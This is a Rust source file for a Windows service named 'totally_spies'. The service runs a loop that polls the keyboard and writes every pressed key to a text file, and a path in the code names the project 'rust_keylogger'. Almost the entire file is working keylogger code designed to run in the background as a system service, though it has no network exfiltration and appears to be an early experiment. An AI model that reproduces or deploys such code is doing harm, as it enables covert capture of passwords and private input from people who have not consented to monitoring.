extern crate windows_service;

use std::fs::File;
use std::io::prelude::*;
use std::ffi::OsString;
use std::time::Duration;
use std::sync::mpsc;

use device_query::{
    DeviceQuery,
    DeviceState,
    Keycode,
};

use anyhow::{
    Result,
    Error,
};

use windows_service::{
    define_windows_service,
    service_dispatcher,
    service::{
        ServiceControl,
        ServiceStatus,
        ServiceControlAccept,
        ServiceExitCode,
        ServiceState, 
        ServiceType,
    },
    service_control_handler::{
        self, 
        ServiceControlHandlerResult
    },
};

define_windows_service!(ffi_service_main, service_main);

const PATH: &str = "C:/Users/mremond/Documents/DevProjects/Rust/rust_keylogger/foo.txt";

fn main() -> Result<(), windows_service::Error> {
    // The service must be installed, otherwise it will not work
    service_dispatcher::start("totally_spies", ffi_service_main)?;
    Ok(())
}

fn service_main(arguments: Vec<OsString>) {
    if let Err(_e) = run_service(arguments) {
        // Handle errors in some way... or not...
    }
}

fn run_service(_arguments: Vec<OsString>) -> Result<(), Error> {
    // Create a channel to be able to poll a stop event from the service worker loop
    let (shutdown_tx, shutdown_rx) = mpsc::channel();

    let event_handler = move |control_event| -> ServiceControlHandlerResult {
        match control_event {
            ServiceControl::Stop => {
                shutdown_tx.send(()).unwrap();
                ServiceControlHandlerResult::NoError
            },
            ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    };

    // Register system service event handler.
    let status_handle = service_control_handler::register("totally_spies", event_handler)?;

    let next_status = ServiceStatus {
        // Should match the one from system service registry
        service_type: ServiceType::OWN_PROCESS,

        // The new state
        current_state: ServiceState::Running,

        // Accept stop events when running
        controls_accepted: ServiceControlAccept::STOP,

        // Used to report an error when starting or stopping only, otherwise must be zero
        exit_code: ServiceExitCode::Win32(0),

        // Only used for pending states, otherwise must be zero
        checkpoint: 0,
        wait_hint: Duration::default(),

        // Process ID
        process_id: None,
    };

    // Tell the system that the service is running now
    status_handle.set_service_status(next_status)?;

    let mut file = File::create(PATH)?;

    file.write_all(b"Hello world!")?;

    let device_state = DeviceState::new();

    loop { // Infinite main loop
        let keys: Vec<Keycode> = device_state.get_keys();
        for key in keys.iter() {
            file.write_all(key.to_string().as_bytes())?;
            file.write_all(b"Hello world!")?;
        }

        match shutdown_rx.recv_timeout(Duration::from_micros(1)) {
            Ok(_) | Err(mpsc::RecvTimeoutError::Disconnected) => break,
            Err(mpsc::RecvTimeoutError::Timeout) => () , 
        };
    }

    let end_status = ServiceStatus {
        // Should match the one from system service registry
        service_type: ServiceType::OWN_PROCESS,

        // The new state
        current_state: ServiceState::Stopped,

        // Accept stop events when running
        controls_accepted: ServiceControlAccept::STOP,

        // Used to report an error when starting or stopping only, otherwise must be zero
        exit_code: ServiceExitCode::Win32(0),

        // Only used for pending states, otherwise must be zero
        checkpoint: 0,
        wait_hint: Duration::default(),

        // Process ID
        process_id: None,
    };
    status_handle.set_service_status(end_status)?;

    Ok(())
}